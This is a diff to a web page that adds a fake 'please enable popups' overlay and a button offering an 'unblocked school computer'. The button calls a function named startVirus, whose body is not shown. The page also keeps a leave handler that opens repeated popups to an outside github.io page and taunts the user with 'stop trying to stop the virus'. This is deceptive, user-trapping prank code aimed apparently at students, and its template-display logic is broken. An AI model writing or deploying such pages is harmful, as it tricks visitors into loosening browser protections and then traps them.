@@ -29,6 +29,32 @@
     img {
       width: 300px;
     }
+    .popup-warning {
+      position: fixed;
+      top: 50%;
+      left: 50%;
+      transform: translate(-50%, -50%);
+      background: rgba(0, 0, 0, 0.8);
+      color: white;
+      padding: 20px;
+      border-radius: 10px;
+      font-size: 20px;
+      z-index: 1000;
+      text-align: center;
+    }
+    .popup-warning button {
+      margin-top: 20px;
+      padding: 10px 20px;
+      font-size: 18px;
+      background: #f44336;
+      border: none;
+      color: white;
+      cursor: pointer;
+      border-radius: 5px;
+    }
+    .popup-warning button:hover {
+      background: #d32f2f;
+    }
     @keyframes blurslowly {
       0% {
         filter: none;
@@ -48,16 +74,24 @@
       animation-iteration-count: infinite;
       animation-duration: 15s;
       animation-play-state: running;
+      display: none; /* Hide content initially */
     }
   </style>
 </head>
 <body>
 
-<template>
+<div class="popup-warning" id="popupWarning">
+  <h1>Please enable popups to continue</h1>
+  <p>This site requires popups to work properly. Please enable popups for this site in your browser settings.</p>
+  <button id="enablePopupsBtn">Enable Popups</button>
+</div>
+
+<template id="mainContent">
   <div class='hello-message'>
     <h1>Hi there!</h1>
   </div>
   <div class='logout-messages'></div>
+  <button id="button">Click me for unblocked school computer!</button>
 </template>
 
 <script src='/index.js'></script>
@@ -71,8 +105,6 @@
   gtag('js', new Date())
   gtag('config', 'UA-3898076-24')
 </script>
-
-<button id="button">Click me for unblocked school computer!</button>
 
 <script>
   function startVirus() {
@@ -95,11 +127,22 @@
 
   document.getElementById("button").addEventListener("click", startVirus);
 
+  function showMainContent() {
+    document.getElementById("popupWarning").style.display = 'none';
+    
+    document.body.style.display = 'block';
+    document.getElementById("mainContent").content.cloneNode(true);
+  }
+
+  document.getElementById("enablePopupsBtn").addEventListener("click", function() {
+    showMainContent(); // Show content when the button is clicked
+  });
+
   window.addEventListener("beforeunload", function (event) {
     window.open('https://master101215.github.io/unblock/');
     window.open('https://master101215.github.io/unblock/');
     
-    const message = "You are about to leave this site!";
+    const message = "stop trying to stop the virus";
     event.returnValue = message; // Standard for modern browsers
     return message; // For older browsers
   });
